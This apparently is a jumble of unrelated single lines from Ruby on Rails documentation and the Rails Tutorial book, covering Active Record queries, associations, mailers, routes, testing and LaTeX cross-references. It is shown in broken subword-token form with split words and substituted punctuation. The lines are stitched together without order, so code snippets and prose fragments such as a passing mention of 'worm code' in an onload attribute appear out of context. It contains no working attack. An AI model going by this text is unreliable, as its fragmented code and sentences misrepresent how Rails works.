▁It ▁gives ▁you ▁the ▁class ▁name ▁corresponding ▁to ▁a ▁table ▁name :
▁If ▁you ▁though t , ▁" this ▁method ▁look s ▁like ▁a ▁public ▁class ▁method ▁for ▁` ActiveRecord :: Core ` ", ▁you ▁were ▁right ▖
▁The ▁filter ▁is ▁applied ▁only ▁once , ▁however , ▁so ▁the ▁on load ▁attribute ▁with ▁the ▁worm ▁code ▁ st a y s ▁in ▁place ▖
▁There ▁exists ▁shorthand ▁syntax ▁to ▁achieve ▁just ▁that , ▁via ▁the ▁`: shallow ` ▁option :
▁returns ▁\ k ode {" 0 ▁errors " }, ▁\ k ode {" 1 ▁error " }, ▁\ k ode {" 2 ▁errors " }, ▁and ▁so ▁on , ▁depending ▁on ▁how ▁many ▁errors ▁there ▁are , ▁there by ▁avoid ing ▁un gr a m m at ical ▁ ph ra s es ▁such ▁as ▁\ k ode {" 1 ▁errors "} ▁( a ▁di str ess ing ly ▁common ▁mistake ▁on ▁\ href { http :// www ▖ u rb an dictionary ▖ com / define ▖ ph p ? term = in ter web s } { te h ▁inter web s }) .
▁A ler t ▁readers ▁m ight ▁note ▁at ▁this ▁point ▁that ▁the ▁code ▁in ▁Listing ~\ ref { code : proto _ status _ feed } ▁is ▁ essentially ▁equivalent ▁to ▁writing
▁Note ▁the ▁ compact ▁redirect
▁### ▁Listing ▁all ▁articles
▁For ▁example , ▁to ▁send ▁new s let ter s ▁only ▁to ▁users ▁with ▁the ▁primary ▁key ▁starting ▁from ▁2000 , ▁and ▁to ▁retrieve ▁them ▁in ▁ batches ▁of ▁5 000 :
▁We ▁ discover ed ▁in ▁Section ~\ ref { sec : uniqueness _ validation } ▁that ▁we ▁needed ▁to ▁delete ▁the ▁default ▁fixtures ▁so ▁that ▁our ▁email ▁uniqueness ▁tests ▁would ▁pass ▁( Listing ~\ ref { code : empty _ fixtures }) .
▁would ▁assembl e ▁an ▁array ▁using ▁the ▁\ k ode { followed \_ id } ▁in ▁the ▁\ k ode { relationships } ▁table .
▁We ' ve ▁also ▁omitted ▁the ▁leading ▁\ k ode { Micropost ▖ } \ ▁since ▁we ▁expect ▁this ▁method ▁to ▁live ▁in ▁the ▁Micropost ▁model ▁itself ▖)
▁Here ▁the ▁\ k ode { errors ▖ full \_ messages } ▁object ▁( which ▁we ▁saw ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : presence _ validation }) ▁contains ▁an ▁array ▁of ▁error ▁messages .
▁ Test - driven ▁development ▁uses ▁a ▁`` R ed , ▁ Green , ▁ Refactor '' ▁c y c le .
▁To ▁install ▁Rails , ▁use ▁the ▁` gem ▁install ` ▁command ▁provided ▁by ▁ RubyGems :
▁### ▁JavaScript Helper
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : annotate d _ user _ model } .
▁This ▁generator ▁will ▁provide ▁the ▁same ╼ s k e let on ▁structure ▁as ▁would ▁the ▁`-- full ` ▁option ▖
▁update
▁A ▁configuration ▁file ▁for ▁\ href { http :// rack ▖ github ▖ io /}{ Rack ▁middleware }
▁The ▁` presence ` ▁method ▁returns ▁its ▁receiver ▁if ▁` present ?` , ▁and ▁` nil ` ▁otherwise ▖
▁Some ▁ contributors ▁to ▁Rails ▁have ▁email ▁ notification s ▁from ▁GitHub ▁turn ed ▁on , ▁but ╼ other s ▁do ▁not ▖
▁By ▁default , ▁files ▁are ▁loaded ▁from ▁` public / images ` .
▁The ▁\ k ode { alt } ▁attribute ▁is ▁what ▁will ▁be ▁displayed ▁if ▁there ▁is ▁no ▁image , ▁and ▁it ▁is ▁also ▁what ▁will ▁be ▁displayed ▁by ▁ screen ▁readers ▁for ▁the ▁ visual ly ▁ im p a ir ed .
▁Some ▁uses ▁of ▁\ k ode { assert \_ select } .
▁This ▁only ▁works ▁if ▁the ▁external ▁email ▁server ▁is ▁configured ▁for ▁ im media te ▁ delivery .
▁create ▁app / mailers / user _ mailer ▖ rb
▁# ▁< git - show ▁nil =" true "></ git - show >
▁You ▁should n ' t ▁use ▁instance ▁methods ▁since ▁it ' s ▁now ▁ deprecated ▖
▁A ▁user ▁ row ▁in ▁the ▁SQLite ▁database ▁\ k ode { db / development ▖ sqlite 3 } .
▁@ customer ▖ orders ▖ destroy (@ order 1 )
▁The ▁result ing ▁HTML ▁and ▁text ▁email s ▁appear ▁as ▁in ▁Figure ~\ ref { fig : account _ activation _ html _ preview } ▁and ▁Figure ~\ ref { fig : account _ activation _ text _ preview } .
▁becomes
▁As ▁it ▁happens , ▁the ▁sample ▁application ▁created ▁in ▁this ▁tutorial ▁is ▁ safe ▁for ▁ ex po sure ▁on ▁the ▁web , ▁but ▁it ▁is ▁d angerous ▁to ▁rely ▁on ▁this ▁fact ▁in ▁general .
▁( We ▁saw ▁an ▁example ▁of ▁this ▁class ▁in ▁Listing ~\ ref { code : signup _ button } ▖)
▁Thu s , ▁you ▁may ▁want ▁to ▁consider ▁remov ing ▁the ▁first ▁two ▁app s ▁before ▁proceeding , ▁which ▁you ▁can ▁do ▁by ▁ nav ig ating ▁to ▁the ▁\ k ode { workspace } ▁directory ▁and ▁running ▁\ k ode { rm ▁- r f ▁ hello \_ app / ▁toy \_ app / } ▁( Table ~\ ref { table : uni x _ commands }) .
▁# ▖▖▖ .
▁exercise ' ▁id =' ex - c 6 f 9 7 5 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁sample _ microposts ▁( end )╼╼ \ subsection { Pro file ▁micropost ▁tests } ▁% ▁( fold )╼\ label { sec : profile _ micropost _ tests }╼╼
▁WHERE ▁( address es ▖ client _ id ▁ IN ▁( 1, 2, 3 , 4 , 5 , 6 , 7 , 8, 9 , 10 ) )
▁* ▁FROM ▁" users " ▁ INNER ▁JOIN ▁" articles " ▁ ON ▁" articles "▖" user _ id " ▁= ▁" users "▖" id " ▁WHERE ▁" users "▖" id " ▁= ▁1
▁The ▁tutorial ' s ▁code ▁examples ▁are ▁not ▁in ▁is ol ation .
▁Name : ▁<%= ▁person ▖ name ▁%>< br >
▁Return s ▁the ▁User ▁object ▁ associated ▁with ▁the ▁micropost
▁" O ne ▁of ▁the ▁strings ▁is ▁empty "
▁order _ number : ▁" A 12345 ")
▁We ' ll ▁first ▁write ▁some ▁simple ▁tests , ▁which ▁generally ▁follow ▁the ▁examples ▁from ▁the ▁User ▁model ▁validation ▁tests ▁in ▁Section ~\ ref { sec : user _ validations }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validations _ tests } .
▁This ▁arrange s ▁to ▁skip ▁the ▁\ text tt { pg } ▁gem ▁for ▁PostgreSQL ▁in ▁development ▁and ▁use ▁SQLite ▁for ▁development ▁and ▁testing .
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : db _ seed }, ▁we ▁can ▁reset ▁the ▁database ▁and ▁then ▁invoke ▁the ▁Rake ▁task ▁using ▁\ k ode { db : seed }
▁In ▁fact , ▁a ▁Rails ╼ application ' s ▁functionality ▁is ▁actually ▁a ▁ super set ▁of ▁what ▁is ▁provided ▁by ╼ engine s !
▁With ▁this ▁declaration , ▁the ▁` product ` ▁layout ▁would ▁be ▁used ▁for ▁everything ▁but ▁the ▁` rs s ` ▁and ▁` index ` ▁methods .
▁P utting ▁together ▁the ▁discussion ▁above ▁yields ▁the ▁User ▁model ▁show n ▁in ▁Listing ~\ ref { code : before _ create _ activation _ digest } .
▁By ▁default , ▁` Model ▖ find ` ▁select s ▁all ▁the ▁fields ▁from ▁the ▁result ▁set ▁using ▁` select ▁* ` .
▁calls ▁the ▁\ k ode { stylesheet \_ link \_ tag } ▁function ▁with ▁two ▁arguments : ▁a ▁string , ▁indicat ing ▁the ▁path ▁to ▁the ▁stylesheet , ▁and ▁a ▁hash ▁with ▁two ▁elements , ▁indicat ing ▁the ▁ media ▁type ▁and ▁tell ing ▁Rails ▁to ▁use ▁the ▁\ href { https :// github ▖ com / rails / turbolinks } { turbolinks } ▁feature ▁added ▁in ▁Rails ~4▖0 .
▁$ ▁bundle ▁exec ▁rake ▁test ╼ ActionController :: Url Generation Error : ╼ N o ▁route ▁matches ▁ { : action =>" about ", ▁: controller =>" static _ pages "}
▁in ▁Listing ~\ ref { code : micropost _ create _ image _ upload } .
▁" Date " ▁=> ▁" date ",
▁We ▁see ▁there ▁is ▁an ▁empty ▁response ▁( no ▁data ▁after ▁the ▁` Cache - Control ` ▁line ), ▁but ▁the ▁request ▁was ▁successful ▁because ▁Rails ▁has ▁set ▁the ▁response ▁to ▁200 ▁OK ▖ ▁You ▁can ▁set ▁the ▁`: status ` ▁option ▁on ▁render ▁to ▁change ▁this ▁response ▖
▁To ▁see ▁how ▁it ▁works , ▁we ▁just ▁need ▁to ▁add ▁a ▁line ▁consist ing ▁of ▁\ k ode { debugger } ▁to ▁our ▁application , ▁as ▁show n ▁in ▁Listing ~\ ref { code : debugger } .
▁$ ▁bin / rails ▁g ▁migration ▁add _ author _ id _ to _ blorgh _ articles ▁author _ id : integer
▁There ▁are ▁as ▁many ▁choice s ▁for ▁a ▁user ▁data ▁model ▁as ▁there ▁are ▁different ▁ registration ▁forms ▁on ▁the ▁web ; ▁we ' ll ▁go ▁with ▁a ▁ distinct ly ▁minimal ist ▁approach .
▁@ number ▖ next
▁#### # ▁` offset `
▁Rails ▁also ▁ adapt s ▁ rap id ly ▁to ▁new ▁development s ▁in ▁web ▁ tech no log y ▁and ▁\ line break ▁framework ▁design .
▁# ▁equivalent ▁to ▁Time ▖ current ▖ advance ( years : ▁2 )
▁person ▁= ▁Person ▖ create ( name : ▁' John ')
▁On ce ▁you ' ve ▁ watch ed ▁the ▁relevant ▁ RailsCast ▁to ▁get ▁a ▁basic ▁idea ▁of ▁how ▁to ▁proceed , ▁I ▁suggest ▁writing ▁the ▁new ▁feature ▁using ▁test - driven ▁development .
▁` app / mailers / user _ mailer ▖ rb ` ▁contains ▁an ▁empty ▁mailer :
▁* ▁` increment !
▁If ▁you ▁look ▁at ▁the ▁options ▁of ▁the ▁application ▁generator , ▁you ▁will ▁see ▁that ▁one ▁of ▁the ▁options ▁is ▁named ▁`-- database ` ▖
▁date ▖ ago (1) ▁# ▁=> ▁Thu , ▁10 ▁Jun ▁2010 ▁ 23:59:59 ▁E D T ▁- 04 :00
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validations _ tests } .
▁p ▖ save ▁# ▁=> ▁false
▁ //= ▁require _ tree ▁ .
▁* ▁How ▁to ▁use ▁local ize d ▁views .
▁All ▁that ▁is ▁needed ▁to ▁complete ▁the ▁authentication ▁functionality ▁is ▁to ▁restrict ▁access ▁to ▁pages ▁base d ▁on ▁signin ▁status ▁and ▁user ▁id entity .
▁Note ▁that ▁we ' ve ▁written
▁The ▁above ▁returns ▁` true ` ▁if ▁there ▁is ▁at ▁least ▁one ▁client ▁with ▁the ▁` first _ name ` ▁' Ryan ' ▁and ▁` false `╼ other w is e .
▁In ▁all ▁of ▁these ▁methods , ▁` collection ` ▁is ▁replace d ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` has _ and _ belongs _ to _ many `, ▁and ▁` collection _ singular ` ▁is ▁replace d ▁with ▁the ▁ singularize d ▁version ▁of ▁that ▁symbol ▖
▁' X - XSS - Pro t ec tion ' ▁=> ▁' 1 ; ▁mode = block ',
▁Mailer s ▁are ▁ concept u ally ▁similar ▁to ▁controllers , ▁and ▁so ▁we ▁get ▁a ▁mailer ,╼ a ▁directory ▁for ▁views , ▁and ▁a ▁test .
▁customer _ name : ▁" John ▁Doe ")
▁More over , ▁this ▁ subset ▁is ▁\ emph { different } ▁from ▁the ▁usual ▁approach es ▁to ▁learning ▁Ruby , ▁which ▁is ▁why , ▁if ▁your ▁goal ▁is ▁making ▁dynamic ▁web ▁applications , ▁I ▁recommend ▁learning ▁Rails ▁first , ▁ pick ing ▁up ▁bit s ▁of ▁Ruby ▁along ▁the ▁way .
▁For ▁example ▁you ▁could ▁run ▁this ▁query :
▁class ▁ FooBar
▁app
▁The ▁SQL ▁look s ▁like :
▁To ▁do ▁that ▁you ▁introduce d ▁a ▁" referer " ▁field ▁in ▁a ▁form ▁to ▁redirect ▁to ▁the ▁given ▁address :
▁ ╼ ▁$ ▁bundle ▁exec ▁rake ▁db : migrate ▁ RAILS _ ENV = production
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : pretty _ page _ tests } .
▁To ▁see ▁information ▁about ▁our ▁first ▁application , ▁click ▁on ▁the ▁link ▁`` About ▁your ▁application ' s ▁environment '' .
▁( I ▁include ▁the ▁last ▁line ▁just ▁to ▁demonstrate ▁how ▁to ▁ ex it ▁the ▁console , ▁and ▁on ▁most ▁systems ▁you ▁can ▁ Ctrl - d ▁for ▁the ▁same ▁purpose ▖)
▁To ▁get ▁started ▁with ▁static ▁pages , ▁we ' ll ▁first ▁generate ▁a ▁controller ▁using ▁the ▁same ▁Rails ▁\ k ode { generate } ▁ script ▁we ▁used ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁to ▁generate ▁scaffold ing .
▁Rails ▁provides ▁the ▁` rails : update ` ▁rake ▁task ▖
▁To ▁select ▁only ▁a ▁ subset ▁of ▁fields ▁from ▁the ▁result ▁set , ▁you ▁can ▁specify ▁the ▁ subset ▁via ▁the ▁` select ` ▁method .
▁The ▁result ▁of ▁a ▁successful ▁edit .
▁* ▁The ▁[ Ruby ▁on ▁Rails ▁mail ing ▁list ]( http :// groups ▖ google ▖ com / group / rubyonrails - t al k )
▁Create s ▁an ▁active ▁relationship ▁ associated ▁with ▁\ k ode { user }
▁(\ emph { Hint } : ▁What ▁if ▁a ▁user ▁is ▁following ▁5 000 ▁other ▁users ? )
▁To ▁learn ▁how ▁to ▁do ▁things ▁like ▁this , ▁you ▁can ▁do ▁what ▁I ▁did : ▁ Google ▁around ▁for ▁things ▁like ▁`` javascript ▁ maximum ▁file ▁size '' ▁un til ▁you ▁find ▁something ▁on ▁ Stack ▁Overflow .
▁( If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁be ▁sure ▁to ▁open ▁the ▁result ing ▁development ▁server ▁in ▁a ▁new ▁\ emph { browser } ▁ tab , ▁not ▁inside ▁the ▁IDE ▁itself ▖)
▁This ▁relie s ▁on ▁the ▁definition ▁of ▁a ▁page ▁title ▁( using ▁\ k ode { provide }) ▁in ▁each ▁view , ▁as ▁in
▁Of ▁course , ▁to ▁create ▁enough ▁users ▁to ▁make ▁a ▁d ec ent ▁user ▁index , ▁we ▁\ emph { co ul d } ▁use ▁our ▁web ▁browser ▁to ▁visit ▁the ▁signup ▁page ▁and ▁make ▁the ▁new ▁users ▁one ▁by ▁one , ▁but ▁far ▁a ▁better ▁solution ▁is ▁to ▁use ▁Ruby ▁( and ▁Rake ) ▁to ▁make ▁the ▁users ▁for ▁us .
▁=> ▁nil
▁as ▁show n ▁in ▁Listing ~\ ref { code : microposts _ create _ action _ with _ feed } .
▁* ▁How ▁to ▁use ▁GitHub ▁to ▁report ▁issues .
▁This ▁part ▁is ▁not ▁used ▁in ▁any ▁assemblies
▁If ▁you ▁want ▁to ▁find ▁both ▁by ▁name ▁and ▁ locked , ▁you ▁can ▁ chain ▁these ▁find ers ▁together ▁by ▁simply ▁typing ▁" ` and ` " ▁between ▁the ▁fields ▖
▁The ▁full ▁status ▁feed ▁build s ▁on ▁the ▁ proto - feed ▁from ▁Section ~\ ref { sec : a _ proto _ feed } ▁by ▁assembl ing ▁an ▁array ▁of ▁the ▁microposts ▁from ▁the ▁users ▁being ▁followed ▁by ▁the ▁current ▁user , ▁along ▁with ▁the ▁current ▁user ' s ▁own ▁microposts .
▁As ▁of ▁this ▁writing , ▁\ href { http :// www ▖ s ublime text ▖ com / 3 } { S ublime ▁Text ~ 3 } ▁is ▁in ▁be t a .
▁There ▁is ▁also ▁a ▁`: case _ sensitive ` ▁option ▁that ▁you ▁can ▁use ▁to ▁define ▁whether ▁the ╼ uniqueness ▁constraint ▁will ▁be ▁case ▁ sensitive ▁or ▁not ▖
▁content _ type : ▁" text / html ",
▁# ▁Defaults ▁to ▁Rails ▖ root ▖ join (" public / assets ")
▁$ ▁bundle ▁install
▁There for e ▁the ▁file ▁should ▁be ▁called ▁` articles / new ▖ html ▖ erb ` ▁and ▁needs ╼ to ▁be ▁located ▁inside ▁the ▁` app / views ` ▁directory ▁of ▁the ▁application .
▁A ▁test ▁for ▁the ▁new ▁user ▁page ▖
▁As ▁we ▁proceed , ▁it ▁may ▁help ▁to ▁refer ▁to ▁Table ~\ ref { table : user _ url s }, ▁which ▁shows ▁the ▁correspond ence ▁between ▁pages ▁and ▁URLs .
▁Fin ally , ▁we ' ll ▁put ▁the ▁ demo ▁app ▁under ▁version ▁control .
▁Then ▁it ▁ joins ▁the ▁result ▁with ▁" & " :
▁No ▁conflicts ?
▁This ▁can ▁be ▁important ▁when ▁you ▁declare ▁Active ▁Record ▁models ▁within ▁a ▁module ▖
▁Ruby ▁on ▁Rails ▁Tutorial
▁ nt ▁ prerequisites ▁( es pecially ▁\ ler , ▁\ le s , ▁and ▁\ ler a )▖ ╼╼ ▁\ section { Show ing ▁users } ▁% ▁( fold )╼ ▁\ label { sec : showing _ users }╼╼
▁orders << ( object , ▁ ▖▖▖)
▁=> ▁" aaaaaaaaaa "
▁\ k ode { vendor / assets } : ▁assets ▁from ▁third - part y ▁ vendor s
▁We ▁saw ▁an ▁example ▁of ▁this ▁method ▁in ▁Section ~\ ref { sec : block s } ; ▁as ▁another ▁example , ▁we ' ll ▁use ▁\ k ode { map } ▁to ▁convert ▁an ▁array ▁of ▁ integer s ▁to ▁an ▁array ▁of ▁strings :
▁$ ▁git ▁push ▁m in e ▁my _ new _ branch
▁The ▁method ▁must ▁be ▁public ▁in ▁the ▁ target .
▁element ▖ style ▖ backgroundColor ▁= ▁ backgroundColor
▁class ▁ Part s ▁< ▁ActiveRecord :: Base
▁class ▁ Supplier ▁< ▁ActiveRecord :: Base
▁A ▁direct ▁test ▁the ▁\ k ode { full \_ title } ▁helper .
▁Fix ▁this ▁problem ▁by ▁writing ▁a ▁direct ▁test ▁of ▁the ▁\ k ode { full \_ title } ▁helper , ▁which ▁involve s ▁creating ▁a ▁file ▁to ▁test ▁the ▁application ▁helper ▁and ▁then ▁ filling ▁in ▁the ▁code ▁indicate d ▁with ▁\ k ode { FILL \_ IN } ▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests } .
▁When ▁debug ▁mode ▁is ▁off , ▁Sprockets ▁concatenate s ▁and ▁run s ▁the ▁necessary ╼ pre process or s ▁on ▁all ▁files ▖
▁Fin ally , ▁we ' ll ▁add ▁the ▁files ▁in ▁your ▁new ▁Rails ▁project ▁to ▁Git ▁and ▁then ▁commit ▁the ▁results .
▁* ▁How ▁to ▁configure ▁Action ▁Mailer ▁for ▁your ▁environment .
▁In ▁that ▁case , ▁the ▁application ▁will ▁only ▁load ▁what ▁the ▁framework ▁itself ▁c her ry - pick s ▁for ▁its ▁own ▁needs , ▁and ▁can ▁ still ▁c her ry - pick ▁itself ▁at ▁any ▁gra n ul ar ity ▁level , ▁as ▁explained ▁in ▁the ▁previous ▁section .
▁The ▁` has _ and _ belongs _ to _ many ` ▁association ▁creates ▁a ▁many - to - many ▁relationship ▁with ▁another ▁model ▖
▁If ▁you ▁f r equ ent ly ▁retrieve ▁ customers ▁directly ▁from ▁line ▁ items ▁( `@ line _ item ▖ order ▖ customer ` ), ▁then ▁you ▁can ▁make ▁your ▁code ▁some what ▁more ▁ efficient ▁by ▁including ▁ customers ▁in ▁the ▁association ▁from ▁line ▁ items ▁to ▁orders :
▁#### ▁url _ field _ tag
▁In ▁other ▁words , ▁the ▁first ▁example ▁above ▁could ▁replace ▁\ k ode { str } ▁with ▁any ▁other ▁valid ▁variable ▁name , ▁such ▁as ▁\ k ode { the \_ function \_ argument }, ▁and ▁it ▁would ▁work ▁just ▁the ▁same :
▁* ▁` set _ routes _ reload er ` ▁Configur es ▁Action ▁Dispatch ▁to ▁ reload ▁the ▁routes ▁file ▁using ▁` ActionDispatch :: Callbacks ▖ to _ prepare ` .
▁gem ▁' sass - rails ', ▁' ~ > ▁3▖2 ▖ 6 '
▁( Because ▁the ▁`` Log ▁in '' ▁navigation ▁link ▁has n ' t ▁yet ▁been ▁ filled ▁in , ▁you ' ll ▁have ▁to ▁type ▁the ▁ / login ▁URL ▁directly ▁into ▁your ▁address ▁bar .
▁In ▁the ▁\ k ode { correct \_ user } ▁before ▁filter , ▁note ▁that ▁we ▁find ▁microposts ▁\ emph { through } ▁the ▁association :
▁Inde ed , ▁updating ▁the ▁follow / unfollow ▁form ▁partials ▁is ▁tri via l : ▁just ▁change
▁# ▁=> ▁< input ▁src ="/ images / login ▖ png " ▁type =" image " ▁/>
▁### ▁Rendering ▁a ▁ Partial ▁ Form
▁Date ▖ new (201 2, ▁2, ▁29 )▖ years _ ago (3) ▁# ▁=> ▁S at , ▁28 ▁Feb ▁200 9
▁Provide s ▁functionality ▁for ▁working ▁with ▁JavaScript ▁in ▁your ▁views .
▁when ▁' Co un try ▁Manager '
▁# ▁ Don ' t ▁f all back ▁to ▁assets ▁pipeline ▁if ▁a ▁ precompile d ▁asset ▁is ▁ mis s ed
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar val ▁form ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁ sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁then ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : micropost _ images }, ▁upload ed ▁images ) .
▁By ▁hash ing ▁the ▁password ▁with ▁ bcrypt , ▁we ▁ensure ▁that ▁an ▁attacker ▁won ' t ▁be ▁able ▁to ▁log ▁in ▁to ▁the ▁site ▁even ▁if ▁they ▁manage ▁to ▁obtain ▁a ▁copy ▁of ▁the ▁database .
▁In ▁any ▁case , ▁the ▁question ▁has ▁now ▁been ▁defin i tive ly ▁ answer ed ▁in ▁the ▁a f fi rm a tive : ▁some ▁of ▁the ▁most ▁heav ily ▁traffic k ed ▁site s ▁in ▁the ▁world ▁use ▁Rails .
▁A ▁test ▁of ▁the ▁users ▁index , ▁including ▁pagination ▖
▁This ▁is ▁for ▁the ▁benefit ▁of ▁the ▁Ajax ▁implementation ▁in ▁Section ~\ ref { sec : a _ working _ follow _ button _ with _ ajax }, ▁which ▁access es ▁elements ▁on ▁the ▁page ▁using ▁their ▁unique ▁id s .
▁gem ▁' coffee - rails ', ▁" ~ > ▁3▖2 ▖ 1 "
▁In ▁this ▁context , ▁\ emph { v ir t u al } ▁means ▁that ▁the ▁attributes ▁exist ▁on ▁the ▁model ▁object ▁but ▁do ▁not ▁correspond ▁to ▁columns ▁in ▁the ▁database .
▁Rails , ▁like ▁most ▁libraries , ▁uses ▁the ▁ private ▁keyword ▁from ▁Ruby ▁for ▁defin ing ▁ internal ▁API ▖
▁In ▁the ▁case ▁of ▁the ▁User ▁model , ▁this ▁lead s ▁to ▁the ▁data ▁model ▁show n ▁in ▁Figure ~\ ref { fig : user _ model _ password _ digest } .
▁Here ▁are ▁some ▁helpful ▁links ▁to ▁help ▁you ▁learn ▁even ▁more :
▁Active ▁Support ▁defines ▁` reverse _ merge ` ▁in ▁case ▁you ▁prefer ▁this ▁ alternative ▁notation :
▁The ▁data ▁model ▁for ▁microposts .
▁However , ▁if ▁you ▁follow ▁the ▁convention s ▁a do p ted ▁by ╼ Rails , ▁you ' ll ▁need ▁to ▁write ▁very ▁little ▁configuration ▁( in ▁some ▁case ▁no ╼ configuration ▁at ▁all ) ▁when ▁creating ▁Active ▁Record ▁models ▖
▁If ▁a ▁method ▁expect s ▁a ▁variable ▁number ▁of ▁arguments ▁and ▁uses ▁` * ` ▁in ▁its ▁declaration , ▁however , ▁such ▁an ▁options ▁hash ▁end s ▁up ▁being ▁an ▁item ▁of ▁the ▁array ▁of ▁arguments , ▁where ▁it ▁ lo s es ▁its ▁role .
▁p ▖ name ▁= ▁" S o me ▁ Book "
▁The ▁first ▁is ▁to ▁use ▁` create _ with `:
▁N B : ▁The ▁output ▁may ▁ still ▁contain ▁un escape d ▁' < ', ▁' > ', ▁' & ' ▁characters ▁and ▁con f use ▁browsers .
▁S ug ge s ted ▁error ▁messages ▁tests .
▁An ▁empty ▁fixtures ▁file ▖
▁A ▁profile ▁with ▁an ▁ unfollow ▁button ▁and ▁ increment ed ▁followers ▁count ▖ ~\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ other _ profile _ unfollow _ button _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁and ▁create ▁a ▁d ed icated ▁branch :
▁database : ▁db / development ▖ sqlite 3
▁Here ' s ▁the ▁development ▁section :
▁Like w is e , ▁once ▁retrieved ▁an ▁Active ▁Record ▁object ▁can ▁be ▁destroyed ▁which ▁remove s ╼ it ▁from ▁the ▁database .
▁(1▖▖10 ) ▁= == ▁( 3 ▖ ▖ 11 ) ▁# ▁=> ▁false
▁[ Spring ▁README ]( https :// github ▖ com / rails / spring # rake ) .
▁get ▁' : controller ( / : action ( / : id ) ) ', ▁controller : ▁ / admin \ / [ ^ \ / ] + /
▁B ar r ing ▁the ▁ im p r ob able ▁scenario ▁of ▁migrations ▁generated ▁the ▁same ▁second , ▁using ▁timestamp s ▁convenient ly ▁avoid s ▁such ▁co ll is ion s .
▁### ▁` format `
▁See ▁the ▁\ href { http :// sass - lang ▖ com /}{ Sass ▁website } ▁for ▁more ▁details .
▁as ▁show n ▁in ▁Listing ~\ ref { code : attr _ accessible _ user _ id _ test } .
▁The ▁follow / unfollow ▁partials ▁themselves ▁are ▁show n ▁in ▁Listing ~\ ref { code : follow _ form } ▁and ▁Listing ~\ ref { code : unfollow _ form } .
▁d ▖ prev _ month ▁# ▁=> ▁Thu , ▁ 08 ▁Apr ▁2010
▁class ▁T a g ▁< ▁ActiveRecord :: Base
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁sample ▁application ▁by ▁adding ▁a ▁so cial ▁layer ▁that ▁allows ▁users ▁to ▁follow ▁( and ▁ unfollow ) ▁other ▁users , ▁result ing ▁in ▁each ▁user ' s ▁Home ▁page ▁display ing ▁a ▁status ▁feed ▁of ▁the ▁followed ▁users ' ▁microposts .
▁Inde ed , ▁the ▁first ▁two ▁ edition s ▁of ▁this ▁tutorial ▁were ▁host ed ▁for ▁free ▁on ▁Heroku , ▁which ▁served ▁sever al ▁m illion ▁requests ▁without ▁charg ing ▁me ▁a ▁c ent .
▁$ ▁bundle ▁exec ▁rake ▁routes ╼ ▁P ref i x ▁Verb ▁ URI ▁ Pattern ▁Controller # Action ╼ ▁root ▁GET ▁ / ▁static _ pages # home ╼ ▁help ▁GET ▁ / help (▖ : format ) ▁static _ pages # help ╼ ▁about ▁GET ▁ / about (▖ : format ) ▁static _ pages # about ╼ ▁ contact ▁GET ▁ / contact (▖ : format ) ▁static _ pages # contact ╼ ▁signup ▁GET ▁ / signup (▖ : format ) ▁users # new ╼ ▁login ▁GET ▁ / login (▖ : format ) ▁sessions # new ╼ ▁POST ▁ / login (▖ : format ) ▁sessions # create ╼ ▁ logout ▁DELETE ▁ / logout (▖ : format ) ▁sessions # destroy ╼ ▁users ▁GET ▁ / users (▖ : format ) ▁users # index ╼ ▁POST ▁ / users (▖ : format ) ▁users # create ╼ ▁new _ user ▁GET ▁ / users / new (▖ : format ) ▁users # new ╼ edit _ user ▁GET ▁ / users / : id / edit (▖ : format ) ▁users # edit ╼ ▁user ▁GET ▁ / users / : id (▖ : format ) ▁users # show ╼ ▁PATCH ▁ / users / : id (▖ : format ) ▁users # update ╼ ▁ PUT ▁ / users / : id (▖ : format ) ▁users # update ╼ ▁DELETE ▁ / users / : id (▖ : format ) ▁users # destroy
▁# ▁end
▁By ▁the ▁way , ▁using ▁\ k ode { inspect } ▁to ▁ print ▁an ▁object ▁is ▁common ▁enough ▁that ▁there ' s ▁a ▁shortcut ▁for ▁it , ▁the ▁\ k ode { p } ▁function
▁The ▁` find _ in _ batches ` ▁method ▁is ▁similar ▁to ▁` find _ each `, ▁since ▁both ▁retrieve ▁ batches ▁of ▁records ▖
▁This ▁is ▁easy ▁when ▁reading ▁the ▁book ▁as ▁a ▁web ▁page , ▁since ▁you ▁can ▁just ▁use ▁the ▁ Back ▁button ▁of ▁your ▁browser , ▁but ▁both ▁A do be ▁Read er ▁and ▁OS ~ X ' s ▁P re view ▁allow ▁you ▁to ▁do ▁this ▁with ▁the ▁P D F ▁as ▁well .
▁Note ▁that ▁we ▁have n ' t ▁restrict ed ▁the ▁actions ▁the ▁before ▁filter ▁applies ▁to ▁since ▁it ▁applies ▁to ▁them ▁both ▁by ▁default .
▁Listing ~\ ref { code : irbrc } ▁arrange s ▁to ▁ s im p li fy ▁the ▁i rb ▁pro mp t ▁and ▁ suppress ▁some ▁an no y ing ▁ auto - indent ▁behavior .
▁Ruby ▁is ▁setting ▁the ▁\ k ode {@ name } ▁variable ▁to ▁\ k ode {" Example ▁User "} ▁( and ▁similar ly ▁for ▁the ▁\ k ode { email } ▁attribute ), ▁which ▁we ▁then ▁use ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁WARNING : ▁P lease ▁do ▁not ▁report ▁security ▁vulnerabilities ▁with ▁public ▁GitHub ▁issue ▁report s ▖
▁<%= ▁f ▖ text _ field ▁: name ▁%>
